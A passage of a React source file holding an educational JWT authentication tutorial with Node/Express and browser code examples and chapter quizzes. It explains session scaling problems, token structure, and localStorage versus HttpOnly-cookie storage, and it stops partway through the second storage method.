import React, { useState, useEffect, useCallback } from 'react';

// ============================================================
// CHAPTER DATA – COMPLETE CONTENT FROM ORIGINAL HTML
// ============================================================

const chapters = [
  {
    id: "intro",
    group: "Foundations",
    label: "Why JWT Exists",
    quiz: {
      q: "Before JWT, traditional web apps used sessions. What was the biggest problem with sessions at scale?",
      opts: [
        "Sessions used too much CPU",
        "Every request needed a database lookup, making horizontal scaling very hard",
        "Sessions could not store user roles",
        "Sessions required HTTPS"
      ],
      ans: 1,
      exp: "Sessions store data on the server (in a database or memory). With multiple servers, they all need to share the same session store. This adds latency, complexity and a single point of failure. JWT solves this by making the token self-contained."
    },
    content: `
      <h2>The problem JWT was born to solve</h2>
      <p>Before we learn <em>what</em> JWT is, we need to understand the pain it was designed to fix. This context will make everything else click instantly.</p>
      <div class="real-life">
        <div class="real-life-title">Real-life analogy — The Hotel Keycard</div>
        <p>Imagine you check into a hotel. The receptionist creates a <strong>guest record</strong> in their computer and gives you a plastic keycard with just a number on it — say, "Room 302". Every time you open a door, the keycard reader calls the front desk: <em>"Is guest #302 allowed here?"</em>. The front desk checks their database and says yes or no.</p>
        <p>That's exactly how <strong>session-based authentication</strong> works. The database is the front desk. Now imagine 10,000 guests per minute all asking the front desk simultaneously. The front desk collapses.</p>
        <p>JWT's approach: instead of a number on your keycard, print all the information directly on the card — your name, room number, checkout date — and <strong>seal it with a tamper-evident holographic sticker</strong>. Any door reader can instantly verify the sticker without calling anyone. That holographic sticker = the JWT signature.</p>
      </div>
      <h2>Session auth — how it worked</h2>
      <div class="steps">
        <div class="step"><div class="step-n">1</div><div class="step-body"><strong>User logs in</strong> — sends email + password to server</div></div>
        <div class="step"><div class="step-n">2</div><div class="step-body"><strong>Server creates a session record</strong> in a database: <code>{ sessionId: "abc123", userId: 42, name: "Alice", expiresAt: ... }</code></div></div>
        <div class="step"><div class="step-n">3</div><div class="step-body"><strong>Server sends a cookie</strong> to the browser containing just the sessionId: <code>sessionId=abc123</code></div></div>
        <div class="step"><div class="step-n">4</div><div class="step-body"><strong>Browser sends cookie automatically</strong> on every request to the same domain</div></div>
        <div class="step"><div class="step-n">5</div><div class="step-body"><strong>Server looks up sessionId in database</strong> to find who the user is — <em>every single request triggers a DB query</em></div></div>
      </div>
      <h2>Why sessions break at scale</h2>
      <div class="g2">
        <div class="mini-card"><h4>Problem 1 — DB lookup per request</h4><p>1 million users × 10 requests/minute = 10 million DB queries/minute just for authentication. Expensive and slow.</p></div>
        <div class="mini-card"><h4>Problem 2 — Multiple servers</h4><p>If you have 3 servers, which one stores the session? Server A has it but the request hit Server B. Now you need a shared session database for all servers.</p></div>
        <div class="mini-card"><h4>Problem 3 — Mobile and APIs</h4><p>Cookies are a browser concept. Native mobile apps, IoT devices, and third-party API clients don't use cookies naturally.</p></div>
        <div class="mini-card"><h4>Problem 4 — Microservices</h4><p>If you have 20 different backend services, they all need access to the shared session store. Complex, slow, fragile.</p></div>
      </div>
      <h2>JWT — the stateless revolution</h2>
      <p>JWT solves all these problems by making the token <strong>self-contained</strong>. The token carries all the information the server needs. The server just <strong>verifies a mathematical signature</strong> — no database, no shared state.</p>
      <div class="flow">
        <div class="flow-box blue">User logs in</div><div class="flow-arr">→</div>
        <div class="flow-box amber">Server creates JWT with user data</div><div class="flow-arr">→</div>
        <div class="flow-box green">Token sent to client</div><div class="flow-arr">→</div>
        <div class="flow-box">Client sends JWT on every request</div><div class="flow-arr">→</div>
        <div class="flow-box green">Server verifies signature — NO DB needed!</div>
      </div>
      <div class="alert alert-ok"><strong>Key insight:</strong> Any server, anywhere in the world, with the same secret key can verify a JWT. No shared database. No coordination. Infinitely scalable.</div>
      <h2>Where JWT is used in the real world</h2>
      <div class="g3">
        <div class="mini-card"><h4>Single Page Apps</h4><p>React, Vue, Angular apps that call REST APIs</p></div>
        <div class="mini-card"><h4>Mobile apps</h4><p>iOS, Android apps authenticating against a backend</p></div>
        <div class="mini-card"><h4>Microservices</h4><p>Services verifying caller identity without a central auth DB</p></div>
        <div class="mini-card"><h4>OAuth2 / OpenID Connect</h4><p>Login with Google, GitHub, etc. — all use JWT (id_token)</p></div>
        <div class="mini-card"><h4>IoT devices</h4><p>Embedded devices authenticating to a cloud backend</p></div>
        <div class="mini-card"><h4>SSO</h4><p>Single sign-on across multiple apps in one organization</p></div>
      </div>
    `
  },
  {
    id: "anatomy",
    group: "Foundations",
    label: "JWT Anatomy (Deep Dive)",
    quiz: {
      q: "Someone claims: 'I changed my JWT payload to give myself admin role — the server accepted it!' What is wrong with their JWT implementation?",
      opts: [
        "Nothing — JWT allows changing the payload",
        "The server forgot to verify the signature, or used a weak secret that was cracked",
        "The JWT was encrypted and the attacker broke the encryption",
        "JWT tokens automatically become admin after a certain time"
      ],
      ans: 1,
      exp: "If changing the payload and sending the modified token works, the server is either not verifying the signature at all (using jwt.decode instead of jwt.verify) or the secret was so weak it was brute-forced. Properly implemented JWT will reject any modified token because the signature won't match."
    },
    content: `
      <h2>A JWT is exactly 3 Base64URL parts joined by dots</h2>
      <p>Look at a real token:</p>
      <div class="token-wrap">
        <span class="tok-h">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</span><span class="tok-dot">.</span><span class="tok-p">eyJzdWIiOiJ1c3JfMTIzIiwibmFtZSI6IkFsaWNlIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNjk5MDAwMDAwLCJleHAiOjE2OTkwMDM2MDB9</span><span class="tok-dot">.</span><span class="tok-s">SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c</span>
      </div>
      <div class="g3">
        <div class="mini-card" style="border-color:#4a2e00"><h4 style="color:#fcd34d">Header (yellow)</h4><p>Algorithm + token type metadata</p></div>
        <div class="mini-card" style="border-color:#064e2e"><h4 style="color:#6ee7b7">Payload (green)</h4><p>Your data — user ID, name, role, expiry</p></div>
        <div class="mini-card" style="border-color:#4a1010"><h4 style="color:#fca5a5">Signature (red)</h4><p>Cryptographic proof of authenticity</p></div>
      </div>
      <h2>Part 1 — The Header</h2>
      <p>The header is a JSON object that describes <strong>how</strong> the token was created. It is Base64URL-encoded — not encrypted, anyone can decode it.</p>
      <pre>{
  "alg": "HS256",   // Algorithm used to create the signature
  "typ": "JWT"      // Type of token (always "JWT")
}</pre>
      <table class="kw-table">
        <tr><td>alg</td><td>The signing algorithm. Common values: HS256 (HMAC-SHA256), RS256 (RSA), ES256 (ECDSA). The server uses this to know how to verify.</td></tr>
        <tr><td>typ</td><td>Token type. Tells middleware: "this is a JWT". Almost always "JWT".</td></tr>
        <tr><td>kid</td><td>Key ID (optional). Used when multiple signing keys exist. Tells verifier which key to use.</td></tr>
        <tr><td>alg: "none"</td><td style="color:#fca5a5">DANGEROUS. Means no signature. Never accept tokens with alg:none.</td></tr>
      </table>
      <h2>Part 2 — The Payload (Claims)</h2>
      <p>This is where your data lives. Each piece of data is called a <strong>claim</strong>. There are 3 types:</p>
      <div class="card card-blue">
        <h3>Registered claims — standard names defined by JWT spec</h3>
        <pre>{
  "iss": "https://auth.myapp.com",   // Issuer — who created this token?
  "sub": "usr_abc123",               // Subject — who is this token ABOUT?
  "aud": "https://api.myapp.com",    // Audience — who should ACCEPT this token?
  "exp": 1699003600,                 // Expiration — Unix timestamp, MUST reject after
  "nbf": 1699000000,                 // Not Before — token invalid BEFORE this time
  "iat": 1699000000,                 // Issued At — when was token created?
  "jti": "unique-id-abc-xyz-123"     // JWT ID — unique per token (for revocation)
}</pre>
      </div>
      <div class="card card-green">
        <h3>Public claims — widely known names (IANA registry)</h3>
        <pre>{
  "name":           "Alice Smith",
  "email":          "alice@example.com",
  "email_verified": true,
  "picture":        "https://cdn.example.com/alice.jpg",
  "locale":         "en-US"
}</pre>
      </div>
      <div class="card card-purple">
        <h3>Private claims — your custom application data</h3>
        <pre>{
  "userId":      "usr_abc123",
  "role":        "admin",
  "permissions": ["read:users", "write:posts", "delete:comments"],
  "department":  "engineering",
  "tenantId":    "tenant_xyz",
  "plan":        "enterprise"
}</pre>
      </div>
      <div class="alert alert-warn"><strong>Critical warning:</strong> The payload is BASE64URL ENCODED — not encrypted. <strong>Anyone who has the token can decode and read every claim.</strong> Never store passwords, credit card numbers, SSNs, or any sensitive data in a JWT payload.</div>
      <h2>Part 3 — The Signature (the security core)</h2>
      <p>The signature is what makes JWT secure. It is a <strong>cryptographic hash</strong> of the header + payload using a secret key. Here is the exact formula:</p>
      <pre>signature = HMAC-SHA256(
  base64url(header) + "." + base64url(payload),
  SECRET_KEY
)</pre>
      <div class="real-life">
        <div class="real-life-title">Real-life analogy — The Wax Seal</div>
        <p>In medieval times, a king would send a letter, roll it up, and press his unique royal seal ring into hot wax. Anyone could open and read the letter (it wasn't secret). But if you tried to change the letter and re-seal it, you couldn't — you don't have the king's unique ring. When the recipient sees the seal is intact, they know the message came from the king and was not tampered with.</p>
        <p>The secret key = the king's ring. The signature = the wax seal. The payload = the letter contents.</p>
      </div>
      <h2>How the signature protects you — step by step</h2>
      <div class="steps">
        <div class="step"><div class="step-n">1</div><div class="step-body">Server creates payload: <code>{"sub":"123","role":"user"}</code></div></div>
        <div class="step"><div class="step-n">2</div><div class="step-body">Base64URL encodes it: <code>eyJzdWIiOiIxMjMiLCJyb2xlIjoidXNlciJ9</code></div></div>
        <div class="step"><div class="step-n">3</div><div class="step-body">Runs <code>HMAC-SHA256(header + "." + payload, SECRET)</code> → produces signature bytes → Base64URL encodes them</div></div>
        <div class="step"><div class="step-n">4</div><div class="step-body">Sends token: <code>header.payload.signature</code> to client</div></div>
        <div class="step"><div class="step-n">5</div><div class="step-body">Attacker tries to change <code>role: "user"</code> to <code>role: "admin"</code> — modifies the payload, gets a new base64 string</div></div>
        <div class="step"><div class="step-n">6</div><div class="step-body">Attacker tries to recreate the signature — but they <strong>don't know the SECRET</strong>, so their hash is completely different</div></div>
        <div class="step"><div class="step-n">7</div><div class="step-body">Server re-computes signature from received header+payload using its SECRET — <strong>signature doesn't match → token REJECTED</strong></div></div>
      </div>
    `
  },
  // Chapter 3: Method 1 — localStorage
  {
    id: "method1",
    group: "Implementation Methods",
    label: "Method 1 — localStorage",
    quiz: {
      q: "Your React SPA stores the JWT in localStorage. An attacker finds an XSS vulnerability in your app and injects a script tag. What can they steal?",
      opts: [
        "Nothing — localStorage is sandboxed per browser tab",
        "The JWT token — the injected script can call localStorage.getItem('token') and send it to an attacker's server",
        "Only session cookies",
        "The user's password"
      ],
      ans: 1,
      exp: "localStorage is accessible to any JavaScript running on the page — including maliciously injected scripts. An XSS attack can read localStorage.getItem('token'), encode it, and send it to an attacker's server via fetch() or a hidden image src. This is why HttpOnly cookies are safer — they cannot be read by JavaScript at all."
    },
    content: `
      <h2>Method 1 — localStorage (Simple approach)</h2>
      <div class="real-life">
        <div class="real-life-title">Real-life analogy — Locker key in your wallet</div>
        <p>You check your bag into a station locker. The attendant gives you a key. You put the key in your wallet. Every time you want your bag, you pull out the wallet, grab the key, and open the locker yourself. <br>The key in your wallet = JWT in localStorage. The locker = the protected API. Anyone who pickpockets your wallet (XSS attack) can open your locker.</p>
      </div>
      <h2>How it works — complete flow diagram</h2>
      <div class="steps">
        <div class="step"><div class="step-n">1</div><div class="step-body"><strong>User fills login form</strong> on the frontend and clicks Submit</div></div>
        <div class="step"><div class="step-n">2</div><div class="step-body"><strong>Frontend sends POST /api/auth/login</strong> with <code>{"email":"alice@test.com","password":"secret"}</code></div></div>
        <div class="step"><div class="step-n">3</div><div class="step-body"><strong>Server validates credentials</strong> — finds user in DB, verifies password hash with bcrypt</div></div>
        <div class="step"><div class="step-n">4</div><div class="step-body"><strong>Server creates JWT</strong> — signs it with secret key — sends it back in JSON response: <code>{"token":"eyJ..."}</code></div></div>
        <div class="step"><div class="step-n">5</div><div class="step-body"><strong>Frontend saves to localStorage:</strong> <code>localStorage.setItem('authToken', token)</code></div></div>
        <div class="step"><div class="step-n">6</div><div class="step-body"><strong>For every protected API call:</strong> frontend reads token from localStorage, adds <code>Authorization: Bearer eyJ...</code> header</div></div>
        <div class="step"><div class="step-n">7</div><div class="step-body"><strong>Server middleware checks header</strong> — verifies JWT signature and expiry — allows or rejects request</div></div>
      </div>
      <hr class="divider">
      <h2>Backend — complete Node.js + Express setup</h2>
      <h3>Token utility functions</h3>
      <div class="file-tag">src/utils/tokenUtils.js</div>
      <pre><code class="language-javascript">const jwt = require('jsonwebtoken');

// generateAccessToken(user) — creates a signed JWT
const generateAccessToken = (user) => {
  return jwt.sign(
    // Payload — what data goes inside the token
    {
      sub:   user._id.toString(), // subject = who this token represents
      email: user.email,
      name:  user.name,
      role:  user.role
    },
    // Secret key — from environment variable
    process.env.ACCESS_TOKEN_SECRET,
    // Options
    {
      expiresIn: '15m',          // token expires in 15 minutes
      algorithm: 'HS256',        // signing algorithm
      issuer:    'myapp-auth',   // identifies who issued this token
      audience:  'myapp-api'     // identifies intended recipient
    }
  );
};

// verifyAccessToken(token) — verifies signature + expiry
// THROWS an error if token is invalid, expired, or tampered
const verifyAccessToken = (token) => {
  return jwt.verify(token, process.env.ACCESS_TOKEN_SECRET, {
    algorithms: ['HS256'],    // ONLY accept HS256 (prevents alg:none attack)
    issuer:    'myapp-auth',
    audience:  'myapp-api'
  });
};

module.exports = { generateAccessToken, verifyAccessToken };</code></pre>
      <h4>Line-by-line breakdown</h4>
      <table class="kw-table">
        <tr><td>jwt.sign(payload, secret, options)</td><td>Creates and returns a JWT string. Encodes payload, adds header, computes HMAC-SHA256 signature.</td></tr>
        <tr><td>sub: user._id</td><td>"subject" — the standard JWT claim for user identity. Always use this for user ID.</td></tr>
        <tr><td>expiresIn: '15m'</td><td>Adds <code>exp</code> claim = now + 15 minutes. Short expiry limits damage if token is stolen.</td></tr>
        <tr><td>jwt.verify(token, secret, options)</td><td>Decodes the token, re-computes the signature, checks <code>exp</code>, <code>iss</code>, <code>aud</code>. Throws if anything is wrong.</td></tr>
        <tr><td>algorithms: ['HS256']</td><td>Whitelist. Prevents attacker from changing header to alg:none or RS256 with your public key as secret.</td></tr>
      </table>
      <h3>Authentication controller</h3>
      <div class="file-tag">src/controllers/authController.js</div>
      <pre><code class="language-javascript">const User    = require('../models/User');
const bcrypt  = require('bcryptjs');
const { generateAccessToken } = require('../utils/tokenUtils');

// POST /api/auth/register
exports.register = async (req, res) => {
  try {
    const { name, email, password } = req.body;

    // --- INPUT VALIDATION ---
    if (!name || !email || !password)
      return res.status(400).json({ error: 'All fields are required' });

    if (password.length < 8)
      return res.status(400).json({ error: 'Password must be at least 8 characters' });

    const emailRegex = /^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$/;
    if (!emailRegex.test(email))
      return res.status(400).json({ error: 'Invalid email format' });

    // --- CHECK DUPLICATE ---
    const existingUser = await User.findOne({ email: email.toLowerCase() });
    if (existingUser)
      return res.status(409).json({ error: 'Email already registered' });
    // 409 = Conflict, more specific than 400

    // --- CREATE USER ---
    // Password is hashed in the User model's pre-save hook
    const user = await User.create({
      name: name.trim(),
      email: email.toLowerCase(),
      passwordHash: password // will be hashed before saving
    });

    // --- GENERATE TOKEN ---
    const token = generateAccessToken(user);

    // --- RESPOND ---
    // Status 201 = Created (more specific than 200 for new resource)
    res.status(201).json({
      message: 'Account created successfully',
      user: {
        id:    user._id,
        name:  user.name,
        email: user.email,
        role:  user.role
      },
      token,        // client will store this in localStorage
      expiresIn: 900 // 900 seconds = 15 minutes, tells client when to refresh
    });

  } catch (error) {
    console.error('Register error:', error);
    res.status(500).json({ error: 'Registration failed. Please try again.' });
  }
};

// POST /api/auth/login
exports.login = async (req, res) => {
  try {
    const { email, password } = req.body;

    // Always return same vague error for both "user not found" and "wrong password"
    // Never reveal WHICH part was wrong — that's a security leak (user enumeration)
    const GENERIC_ERROR = 'Invalid email or password';

    if (!email || !password)
      return res.status(400).json({ error: GENERIC_ERROR });

    // --- FIND USER ---
    const user = await User.findOne({ email: email.toLowerCase() });
    if (!user)
      return res.status(401).json({ error: GENERIC_ERROR });
    // 401 = Unauthorized (not authenticated)

    // --- VERIFY PASSWORD ---
    const passwordMatches = await bcrypt.compare(password, user.passwordHash);
    if (!passwordMatches)
      return res.status(401).json({ error: GENERIC_ERROR });

    // --- CHECK ACCOUNT STATUS ---
    if (!user.isActive)
      return res.status(403).json({ error: 'Account has been disabled. Contact support.' });
    // 403 = Forbidden (authenticated but not allowed)

    // --- GENERATE TOKEN ---
    const token = generateAccessToken(user);

    // --- RESPOND ---
    res.status(200).json({
      message: 'Login successful',
      user: {
        id:    user._id,
        name:  user.name,
        email: user.email,
        role:  user.role
      },
      token,
      expiresIn: 900
    });

  } catch (error) {
    console.error('Login error:', error);
    res.status(500).json({ error: 'Login failed. Please try again.' });
  }
};</code></pre>
      <h3>Auth middleware — the gatekeeper</h3>
      <div class="file-tag">src/middleware/authMiddleware.js</div>
      <pre><code class="language-javascript">const { verifyAccessToken } = require('../utils/tokenUtils');

// authMiddleware — call this on every route you want to protect
// It reads the JWT from the Authorization header, verifies it,
// and attaches the decoded user data to req.user
const authMiddleware = (req, res, next) => {
  // --- STEP 1: READ THE HEADER ---
  const authHeader = req.headers['authorization'];
  // The header looks like: "Authorization: Bearer eyJhbGci..."
  // We check it exists and has the right format

  if (!authHeader) {
    return res.status(401).json({
      error: 'Authorization header is missing',
      hint: 'Add: Authorization: Bearer YOUR_TOKEN'
    });
  }

  if (!authHeader.startsWith('Bearer ')) {
    return res.status(401).json({
      error: 'Invalid authorization format',
      hint: 'Format must be: Bearer YOUR_TOKEN'
    });
  }

  // --- STEP 2: EXTRACT THE TOKEN ---
  // Split "Bearer eyJhbGci..." on space, take the second part
  const token = authHeader.split(' ')[1];

  if (!token || token === 'undefined' || token === 'null') {
    return res.status(401).json({ error: 'Token is missing or empty' });
  }

  // --- STEP 3: VERIFY THE TOKEN ---
  // verifyAccessToken will THROW if:
  // - signature is invalid (token was tampered with)
  // - token has expired (exp claim is in the past)
  // - issuer/audience is wrong
  // - algorithm is wrong
  try {
    const decoded = verifyAccessToken(token);
    // decoded = { sub: "usr_123", email: "alice@...", role: "admin", iat: ..., exp: ... }

    // Attach decoded payload to the request object
    // All subsequent middleware and route handlers can access req.user
    req.user = decoded;

    next(); // ← pass control to the next middleware/route handler

  } catch (error) {
    // Different error types for different problems
    if (error.name === 'TokenExpiredError') {
      return res.status(401).json({
        error:     'Your session has expired. Please log in again.',
        code:      'TOKEN_EXPIRED',
        expiredAt: error.expiredAt
      });
    }

    if (error.name === 'JsonWebTokenError') {
      // Could be: invalid signature, malformed token, invalid alg, invalid iss/aud
      return res.status(403).json({
        error:  'Token is not valid',
        code:   'INVALID_TOKEN',
        reason: error.message
      });
    }

    if (error.name === 'NotBeforeError') {
      return res.status(403).json({
        error: 'Token is not yet valid',
        code:  'TOKEN_NOT_ACTIVE'
      });
    }

    // Unknown error
    console.error('JWT verification error:', error);
    res.status(500).json({ error: 'Authentication error' });
  }
};

// requireRole(...roles) — use AFTER authMiddleware
// Checks if req.user.role matches one of the allowed roles
const requireRole = (...allowedRoles) => {
  return (req, res, next) => {
    if (!req.user) {
      return res.status(401).json({ error: 'Not authenticated' });
    }
    if (!allowedRoles.includes(req.user.role)) {
      return res.status(403).json({
        error: 'You do not have permission to access this resource',
        yourRole: req.user.role,
        requiredRole: allowedRoles.join(' or ')
      });
    }
    next();
  };
};

module.exports = { authMiddleware, requireRole };</code></pre>
      <h3>Routes</h3>
      <div class="file-tag">src/routes/authRoutes.js</div>
      <pre><code class="language-javascript">const express    = require('express');
const router     = express.Router();
const rateLimit  = require('express-rate-limit');
const authCtrl   = require('../controllers/authController');

// Rate limiter — prevent brute force attacks on login
// Allows max 10 login attempts per 15 minutes per IP address
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes window
  max:      10,              // max 10 requests per window
  message:  { error: 'Too many login attempts. Please try again in 15 minutes.' },
  standardHeaders: true,    // return rate limit info in headers
  legacyHeaders:   false
});

// Rate limiter for registration — prevent spam account creation
const registerLimiter = rateLimit({
  windowMs: 60 * 60 * 1000, // 1 hour window
  max:      5,               // max 5 registrations per IP per hour
  message:  { error: 'Too many accounts created. Try again in an hour.' }
});

router.post('/register', registerLimiter, authCtrl.register);
router.post('/login',    loginLimiter,    authCtrl.login);

module.exports = router;</code></pre>
      <div class="file-tag">src/routes/protectedRoutes.js</div>
      <pre><code class="language-javascript">const express    = require('express');
const router     = express.Router();
const { authMiddleware, requireRole } = require('../middleware/authMiddleware');

// GET /api/profile — any logged-in user
router.get('/profile', authMiddleware, (req, res) => {
  // req.user is available here because authMiddleware ran first
  res.json({
    message: 'Profile data retrieved',
    user: {
      id:    req.user.sub,
      email: req.user.email,
      name:  req.user.name,
      role:  req.user.role
    }
  });
});

// GET /api/admin — only admins
// Both middlewares run: first verify token, then check role
router.get('/admin/dashboard',
  authMiddleware,
  requireRole('admin'),
  (req, res) => {
    res.json({ message: 'Welcome to the admin dashboard' });
  }
);

// GET /api/mod — admins OR moderators
router.get('/mod/queue',
  authMiddleware,
  requireRole('admin', 'moderator'),
  (req, res) => {
    res.json({ message: 'Moderation queue' });
  }
);

module.exports = router;</code></pre>
      <hr class="divider">
      <h2>Frontend — complete Vanilla JavaScript</h2>
      <div class="file-tag">frontend/api.js — full client module</div>
      <pre><code class="language-javascript">// Configuration
const API_BASE = 'http://localhost:5000/api';

// ─────────────────────────────────────────────────────────
// TOKEN MANAGEMENT
// ─────────────────────────────────────────────────────────

// Store the JWT and user data
function saveAuthData(token, user) {
  localStorage.setItem('authToken', token);
  localStorage.setItem('authUser', JSON.stringify(user));
}

// Clear all auth data (on logout or error)
function clearAuthData() {
  localStorage.removeItem('authToken');
  localStorage.removeItem('authUser');
}

// Get the current token (or null)
function getToken() {
  return localStorage.getItem('authToken');
}

// Get the current user object (or null)
function getCurrentUser() {
  const userJson = localStorage.getItem('authUser');
  return userJson ? JSON.parse(userJson) : null;
}

// Check if the user is currently logged in
function isLoggedIn() {
  return !!getToken();
}

// ─────────────────────────────────────────────────────────
// AUTH FUNCTIONS
// ─────────────────────────────────────────────────────────

async function register(name, email, password) {
  const response = await fetch(API_BASE + '/auth/register', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'  // tell server we're sending JSON
    },
    body: JSON.stringify({ name, email, password })
  });

  const data = await response.json();

  if (!response.ok) {
    // response.ok is true for 2xx status codes
    throw new Error(data.error || 'Registration failed');
  }

  // Save token and user data to localStorage
  saveAuthData(data.token, data.user);
  return data;
}

async function login(email, password) {
  const response = await fetch(API_BASE + '/auth/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ email, password })
  });

  const data = await response.json();

  if (!response.ok) {
    throw new Error(data.error || 'Login failed');
  }

  saveAuthData(data.token, data.user);
  return data;
}

function logout() {
  clearAuthData();
  // Redirect to login page
  window.location.href = '/login.html';
}

// ─────────────────────────────────────────────────────────
// API REQUESTS — automatically attach JWT
// ─────────────────────────────────────────────────────────

async function apiRequest(endpoint, options = {}) {
  const token = getToken();

  // Build request with Authorization header
  const requestOptions = {
    ...options,
    headers: {
      'Content-Type': 'application/json',
      ...(token ? { 'Authorization': \`Bearer \${token}\` } : {}),
      ...(options.headers || {})
    }
  };

  const response = await fetch(\`\${API_BASE}\${endpoint}\`, requestOptions);
  const data = await response.json();

  // Handle auth errors
  if (response.status === 401) {
    if (data.code === 'TOKEN_EXPIRED') {
      // Token expired — clear data and redirect to login
      clearAuthData();
      alert('Your session has expired. Please log in again.');
      window.location.href = '/login.html';
      return null;
    }
  }

  if (!response.ok) {
    throw new Error(data.error || \`Request failed: \${response.status}\`);
  }

  return data;
}

// Convenience wrappers
const api = {
  get:    (url)          => apiRequest(url, { method: 'GET' }),
  post:   (url, body)    => apiRequest(url, { method: 'POST',   body: JSON.stringify(body) }),
  put:    (url, body)    => apiRequest(url, { method: 'PUT',    body: JSON.stringify(body) }),
  delete: (url)          => apiRequest(url, { method: 'DELETE' })
};</code></pre>
      <div class="file-tag">frontend/login.html — complete example</div>
      <pre><code class="language-javascript">&lt;!DOCTYPE html&gt;
&lt;html lang="en"&gt;
&lt;head&gt;
  &lt;meta charset="UTF-8"&gt;
  &lt;title&gt;Login&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
  &lt;h1&gt;Login&lt;/h1&gt;
  &lt;form id="loginForm"&gt;
    &lt;div&gt;
      &lt;label for="email"&gt;Email&lt;/label&gt;
      &lt;input type="email" id="email" required placeholder="you@example.com"&gt;
    &lt;/div&gt;
    &lt;div&gt;
      &lt;label for="password"&gt;Password&lt;/label&gt;
      &lt;input type="password" id="password" required placeholder="Min 8 characters"&gt;
    &lt;/div&gt;
    &lt;p id="errorMsg" style="color:red; display:none"&gt;&lt;/p&gt;
    &lt;button type="submit" id="submitBtn"&gt;Login&lt;/button&gt;
  &lt;/form&gt;

  &lt;script src="api.js"&gt;&lt;/script&gt;
  &lt;script&gt;
    // Redirect if already logged in
    if (isLoggedIn()) window.location.href = '/dashboard.html';

    document.getElementById('loginForm').addEventListener('submit', async (e) => {
      e.preventDefault(); // prevent page reload

      const email    = document.getElementById('email').value.trim();
      const password = document.getElementById('password').value;
      const errorEl  = document.getElementById('errorMsg');
      const btn      = document.getElementById('submitBtn');

      errorEl.style.display = 'none';
      btn.disabled = true;
      btn.textContent = 'Logging in...';

      try {
        const data = await login(email, password);
        // Login successful — redirect to dashboard
        window.location.href = '/dashboard.html';

      } catch (err) {
        errorEl.textContent = err.message;
        errorEl.style.display = 'block';
        btn.disabled = false;
        btn.textContent = 'Login';
      }
    });
  &lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre>
      <div class="file-tag">frontend/dashboard.html — using the token</div>
      <pre><code class="language-javascript">&lt;script src="api.js"&gt;&lt;/script&gt;
&lt;script&gt;
  // Protect this page — redirect if not logged in
  if (!isLoggedIn()) window.location.href = '/login.html';

  // Show user info from localStorage (no API call needed)
  const user = getCurrentUser();
  document.getElementById('username').textContent = user.name;

  // Fetch fresh data from protected API
  async function loadDashboard() {
    try {
      const data = await api.get('/profile');
      console.log('Profile:', data.user);
    } catch (err) {
      console.error('Failed to load profile:', err);
    }
  }

  loadDashboard();

  // Logout button
  document.getElementById('logoutBtn').addEventListener('click', logout);
&lt;/script&gt;</code></pre>
      <div class="alert alert-warn"><strong>When to use Method 1:</strong> Learning projects, internal admin tools, quick prototypes, or when your app has strict XSS prevention (Content Security Policy, sanitizing all user input). For anything handling sensitive data (banking, healthcare, e-commerce), use Method 2 instead.</div>
    `
  },
  // Chapter 4: Method 2 — HttpOnly Cookie
  {
    id: "method2",
    group: "Implementation Methods",
    label: "Method 2 — HttpOnly Cookie",
    quiz: {
      q: "A user logs out. Their access token (15 min lifetime) is currently valid with 10 minutes remaining. Using Method 2 (in-memory access token + HttpOnly refresh token cookie), what happens if an attacker reuses that access token within those 10 minutes?",
      opts: [
        "Nothing — logout deletes the token",
        "The access token still works for up to 10 more minutes — this is accepted because it's short-lived",
        "The server checks a revocation list and blocks it",
        "The HttpOnly cookie blocks the request"
      ],
      ans: 1,
      exp: "This is the fundamental trade-off of stateless JWT. The access token is valid until it expires — logout only clears the refresh token cookie. For most apps the 15-minute window is an acceptable risk. For high-security apps, add a Redis revocation check (Method 5). This is why short expiry times matter."
    },
    content: `
      <h2>Method 2 — HttpOnly Cookie + In-Memory Access Token</h2>
      <div class="real-life">
        <div class="real-life-title">Real-life analogy — Two-key bank vault</div>
        <p>A high-security bank vault requires TWO keys: the bank manager's key (kept at the bank) and your key (you carry it). Your key alone can't open the vault — you need both.</p>
        <p>The HttpOnly cookie = the bank manager's key (stored by the browser, JavaScript can never touch it). The in-memory access token = your temporary entry pass (valid for 15 minutes, exists only in your brain/memory, forgotten when you leave the bank). An attacker who steals your entry pass can only use it for 15 minutes. An attacker who can't read HttpOnly cookies can never renew it.</p>
      </div>
      <h2>Architecture overview</h2>
      <div class="g2">
        <div class="mini-card" style="border-color:#1e3a5f"><h4 style="color:#93c5fd">Access Token</h4><p>Stored in JavaScript memory (a variable). Lifetime: 15 minutes. Sent in Authorization header. Lost on page refresh. Renewed silently using the refresh token.</p></div>
        <div class="mini-card" style="border-color:#064e2e"><h4 style="color:#6ee7b7">Refresh Token</h4><p>Stored in HttpOnly cookie. Lifetime: 7 days. JavaScript CANNOT read it. Sent automatically by browser. Used only to get new access tokens.</p></div>
      </div>
      <h2>Why in-memory for access token?</h2>
      <div class="g3">
        <div class="mini-card"><h4>Vs localStorage</h4><p>localStorage persists but JS can read it. Memory storage = if XSS attacker runs JS, they can't find the token (it's just a variable)</p></div>
        <div class="mini-card"><h4>The only downside</h4><p>Token is lost on page refresh. Solution: on every page load, silently call /refresh using the HttpOnly cookie to get a new one. User never notices.</p></div>
        <div class="mini-card"><h4>Why HttpOnly for refresh?</h4><p>HttpOnly = browser will NEVER expose this cookie to JavaScript. Even a full XSS attack cannot read it. Only HTTP requests can use it.</p></div>
      </div>
      <h2>Complete flow — step by step</h2>
      <div class="steps">
        <div class="step"><div class="step-n">1</div><div class="step-body"><strong>Login:</strong> Frontend sends credentials. Server responds with: access token in JSON body + refresh token in HttpOnly Set-Cookie header</div></div>
        <div class="step"><div class="step-n">2</div><div class="step-body"><strong>Frontend stores:</strong> access token in a JS variable <code>let accessToken = data.accessToken</code>. Refresh token auto-stored by browser in the HttpOnly cookie.</div></div>
        <div class="step"><div class="step-n">3</div><div class="step-body"><strong>API request:</strong> Frontend sends <code>Authorization: Bearer {accessToken}</code>. Server verifies JWT. Returns data.</div></div>
